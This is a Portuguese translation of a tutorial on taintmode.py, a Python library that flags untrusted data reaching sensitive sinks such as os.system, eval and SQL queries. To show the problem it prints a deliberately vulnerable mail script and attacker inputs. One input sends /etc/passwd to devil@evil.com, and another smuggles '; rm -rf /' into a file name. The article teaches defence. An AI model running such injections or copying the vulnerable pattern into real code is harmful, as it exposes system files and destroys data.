--------------------
Taint Mode em Python
--------------------

.. class:: endnote

+-------------------------------------------+-------------------------------------------+
| .. image:: ../taint/juanjodetraje.jpg     |**Autor:** Juanjo Conti                    |
|    :class: right foto                     |                                           |
|                                           |Juanjo é Engenheiro de Sistemas de         |
|                                           |Informação. Vem programando em Python há   |
|                                           |5 anos, e utiliza a linguagem para         |
|                                           |trabalho, pesquisa e diversão.             |
|                                           |                                           |
|                                           |**Blog:** http://juanjoconti.com.ar        |
|                                           |                                           |
|                                           |**Email:** jjconti@gmail.com               |
|                                           |                                           |
|                                           |**Twitter:** @jjconti                      |
|                                           |                                           |
|                                           |**Tradução:** Rafael Alencar               |
|                                           |                                           |
|                                           |                                           |
+-------------------------------------------+-------------------------------------------+

Este artigo é baseado no documento *A Taint Mode for Python via a Library* que eu escrevi
conjuntamente com o Dr. Alejandro Russo, da Universidade de Tecnologia de Chalmers, Suécia,
e que foi apresentado em 24 de junho na conferência OWASP App Sec Research 2010.

Introdução
----------

Vulnerabilidades em aplicações web representam uma ameaça para os sistemas
online. Ataques de *SQL injection* e *cross-site scripting (XSS)* são os
mais comuns na atualidade. Estes ataques são muitas vezes resultados de uma
validação de entradas inapropriada ou inexistente.

Para auxiliar na descoberta destas vulnerabilidades, linguagens de script
web como Perl, Ruby, PHP e Python são ferramentas úteis para o emprego de
técnicas de análise de vulnerabilidades, como a *Taint Analysis*.
Estas análises geralmente são implementadas como um monitor de execução,
onde o interpretador precisa ser adaptado para possuir esta característica.
No entanto, modificar o interpretador é uma tarefa muito grande, e esta
ideia não vem tendo adoção popular.

Diferentemente da abordagem anterior, taintmode.py provê análise de
vulnerabilidades para a linguagem Python por meio de uma biblioteca escrita
inteiramente em Python, evitando que sejam realizadas modificações no
interpretador. O conceito de classes, decoradores e tipagem dinâmica permitem
uma solução leve, fácil de usar, e particularmente pura.
Com pouco ou nenhum esforço, a biblioteca pode ser adaptada para trabalhar
com diferentes interpretadores Python.


Conceitos de Taint Analysis
---------------------------

Primeiramente, vamos falar sobre os conceitos básicos:

**Fontes não confiáveis.** Qualquer dado não confiável é marcado como
manchado (*tainted*). Exemplos disso são: qualquer dado recebido via
parâmetros GET ou POST, cabeçalhos HTTP e requisições AJAX. Também podem
ser marcados como manchados os dados provenientes da camada de persistência.
O banco de dados pode ter sido adulterado por uma aplicação externa, ou os
dados podem ter sido interceptados e modificados em trânsito.

Os **receptores sensíveis** (*Sensitive Sinks*) são aqueles pontos do sistema nos
quais não queremos que cheguem dados não validados, já que eles podem conter um
ataque mascarado. Alguns exemplos são: um navegador ou um motor que renderize HTML,
sistemas de banco de dados, o sistema operacional e o próprio interpretador Python.

O terceiro elemento em jogo são os métodos de sanitização. Eles nos permitem
escapar, codificar ou validar entradas de dados para que fiquem em um formato
adequado para serem enviados para um receptor sensível. Por exemplo, em Python,
cgi.escape é um método de sanitização:

.. code-block:: pycon

    >>> import cgi
    >>> cgi.escape("<script>alert('este é um ataque')</script>")
    "&lt;script&gt;alert('este \xc3\xa9 um ataque')&lt;/script&gt;"


Como usá-lo?
------------

Este é um simples exemplo proposto, que nos permite compreender os conceitos
sem nos preocuparmos com o problema:

.. code-block:: python

    import sys
    import os

    def get_data(args):
        return args[1], args[2]

    usermail, file = get_data(sys.argv)

    cmd = 'mail -s "Requested file" ' + usermail + ' < ' + file
    os.system(cmd)

O script recebe um endereço de e-mail e um nome de arquivo com argumentos
de entrada. Como resultado, ele envia o arquivo por e-mail ao seu dono.

O problema com esta aplicação é que o autor não teve em mente alguns usos
alternativos que um atacante poderia explorar. Alguns exemplos são:

.. code-block:: bash

    python email.py alice@domain.se ./reportJanuary.xls
    python email.py devil@evil.com  '/etc/passwd'
    python email.py devil@evil.com  '/etc/passwd ; rm -rf / '

O primeiro exemplo é o uso correto da aplicação, o qual o programador teve
em mente quando o escreveu. O segundo mostra a primeira vulnerabilidade: um
atacante poderia enviar a si mesmo o conteúdo de /etc/passwd. O terceiro exemplo
mostra uma situação mais perigosa: o atacante não apenas rouba informações sensíveis
do sistema como também apaga arquivos. É claro que para este cenário ocorrer ele
depende de como o servidor está configurado e dos privilégios do atacante no momento
da execução da aplicação. Mas eu acho que você entendeu a ideia.

Então... como esta biblioteca poderia ter ajudado o programador a ficar alerta com
estes problemas e corrigi-los? O primeiro passo é importar os componentes da biblioteca
e marcar os receptores sensíveis e as fontes não confiáveis. Segue a versão modificada do
programa:

.. code-block:: python

    import sys
    import os
    from taintmode import untrusted, ssink, cleaner, OSI

    os.system = ssink(OSI)(os.system)

    @untrusted
    def get_data(args):
        return [args[1], args[2]]

    usermail, filename = get_data(sys.argv)

    cmd = 'mail -s "Requested file" ' + usermail + ' < ' + filename
    os.system(cmd)

Note que precisamos marcar a função get_data como uma fonte não confiável
(com o decorador "untrusted") e os.system como um receptor sensível a ataques
de Injeção de Sistema Operacional (OSI).

Agora, quando tentarmos executar o programa (não é importante se estamos
tentando efetuar um ataque ou não) nós obtemos esta mensagem na saída padrão:

.. code-block:: bash

    $ python email.py jjconti@gmail.com myNotes.txt
    ===============================================================================
    Violation in line 14 from file email.py
    Tainted value: mail -s "Requested file" jjconti@gmail.com < miNotes.txt
    -------------------------------------------------------------------------------
        usermail, filename = get_data(sys.argv)
        
        cmd = 'mail -s "Requested file" ' + usermail + ' < ' + filename
    --> os.system(cmd)

    ===============================================================================

A biblioteca interceptou a execução exatamente antes dos dados não confiáveis chegarem
ao receptor sensível, e nos informou sobre isso. O próximo passo é adicionar funções para
sanitizar os dados de entrada:

.. code-block:: python

    import sys
    import os
    from taintmode import untrusted, ssink, cleaner, OSI
    from cleaners import clean_osi
    clean_osi = cleaner(OSI)(clean_osi)
    os.system = ssink(OSI)(os.system)

    @untrusted
    def get_data(args):
        return [args[1], args[2]]

    usermail, filename = get_data(sys.argv)
    usermail = clean_osi(usermail)
    filename = clean_osi(filename)

    cmd = 'mail -s "Requested file" ' + usermail + ' < ' + filename
    os.system(cmd)

Neste exemplo nós importamos *clean_osi*, uma função capaz de limpar
dados de entrada contra ataques de Injeção de Sistema Operacional, e na
próxima linha nós a habilitamos para fazer isso (este passo é requerido
pela biblioteca).
Finalmente, nós utilizamos a função para limpar as entradas do programa. Se
nós executarmos o programa novamente, ele irá rodar normalmente.


Como funciona?
--------------

A biblioteca utiliza identificadores para diferentes vulnerabilidades com as
quais você está trabalhando; estes identificadores são chamados de *tags*.
Ela também provê decoradores para marcar diferentes partes do programa (classes,
métodos ou funções) como algum dos três elementos mencionados na seção sobre
*Taint Analisys*.

untrusted
~~~~~~~~~

*untrusted* é um decorador utilizado para indicar que os valores retornados por
uma função ou método não são confiáveis. Como os valores não confiáveis podem conter
potencialmente qualquer tipo de mancha (*taint*), estes valores contêm todas as *tags*.
Não sabemos quem pode estar escondido por trás e que tipo de ataque pretende realizar.

Se você possui acesso à implementação da função ou método, por exemplo se ela faz parte
de seu próprio código, o decorador pode ser aplicado utilizando o açúcar sintático do
Python:

.. code-block:: python

    @untrusted
    def from_the_outside():
        ...
   
Ao utilizar módulos de terceiros, nós continuamos podendo aplicar o decorador. O próximo
exemplo é de um programa que utiliza o framework web.py:

.. code-block:: python

    import web
    web.input = untrusted(web.input)

ssink
~~~~~

O decorador ssink deve ser utilizado para marcarmos aquelas funções ou métodos
que não queremos que sejam alcançadas por valores "manchados": receptores sensíveis
ou *sensitive sinks*.

Estes receptores são sensíveis a um tipo de vulnerabilidade, que precisa ser especificada
quando o decorador for utilizado.

Por exemplo, a função *eval* do Python é sensível a ataques de Injeção de
Interpretador (*Interpreter Injection*). A forma de marcá-la como tal é:

.. code-block:: python

    eval = ssink(II)(eval)

O framework web.py nos provê exemplos de receptores sensíveis a ataques de Injeção SQL:

.. code-block:: python

    import web
    db = web.database(dbn="sqlite", db=DB_NAME)
    db.delete = ssink(SQLI)(db.delete)
    db.select = ssink(SQLI)(db.select)
    db.insert = ssink(SQLI)(db.insert)

Assim como nos outros decoradores, se o receptor sensível é implementado em nosso código,
nós podemos utilizar um açúcar sintático:

.. code-block:: python

    @ssink(XSS):
    def render_answer(input):
        ...

O decorador pode também ser utilizado sem que se especifique a vulnerabilidade. Neste
caso, o receptor é marcado como sensível a todos os tipos de vulnerabilidades, embora este
não seja um caso muito comum.

.. code-block:: python

    @ssink():
    def very_sensitive(input):
        ...

Quando um valor manchado alcança um receptor sensível, estamos diante de uma vulnerabilidade,
e um mecanismo apropriado é executado.

cleaner
~~~~~~~

*cleaner* é um decorador utilizado para indicar que um método ou função tem a habilidade
de limpar as "manchas" em um valor.

Por exemplo, a função plain_text remove código HTML da entrada e retorna um novo valor limpo:

.. code-block:: python

    >>> plain_text("Isto é <b>negrito</b>")
    'Isto é negrito'

    >>> plain_text("Clique <a href="http://www.google.com">aqui</a>")
    'Clique aqui'

Funções deste tipo são associadas a um determinado tipo de vulnerabilidade;
Assim, a forma adequada de utilizar o decorador *cleaner* é especificando o
tipo da vulnerabilidade.
Novamente, há duas maneiras de se fazer isso. na definição:

.. code-block:: python

    @cleaner(XSS)
    def plain_text(input):
        ...

ou antes de começarmos a utilizar a função em nosso programa:

.. code-block:: python

    plain_text = cleaner(XSS)(plain_text)
    

Taint aware
~~~~~~~~~~~

Uma das partes principais da biblioteca se encarrega de monitorar a informação
"manchada" para as classes built-in (como a classes int e str).

A biblioteca define, dinamicamente, subclasses para agregar um atributo às classes
originais que permite o monitoramento; para cada objeto o atributo consiste em
um conjunto de *tags* representando as "manchas" que um objeto pode ter em
determinado momento da execução. Os objetos são considerados "sem manchas" quando
o conjunto de *tags* está vazio.
No contexto da biblioteca, estas subclasses são chamadas *taint-aware classes*.
Os métodos herdados das classes *built-in* são redefinidos para serem capazes
de propagar a informação das manchas.

Por exemplo, se a e b são objetos manchados, c possuirá a união das manchas de ambos:
 
.. code-block:: python

    c = a.action(b)


Estado atual
------------

Neste breve artigo foram expostas as principais características da biblioteca.
Para conhecer as funcionalidades mais avançadas e outros detalhes de implementação
você pode visitar http://www.juanjoconti.com.ar/taint/


Mais informações & links
------------------------

* OWASP App Sec 2010: http://alturl.com/5u94e
* OWASP: http://www.owasp.org
* Segurança em Python: http://www.pythonsecurity.org

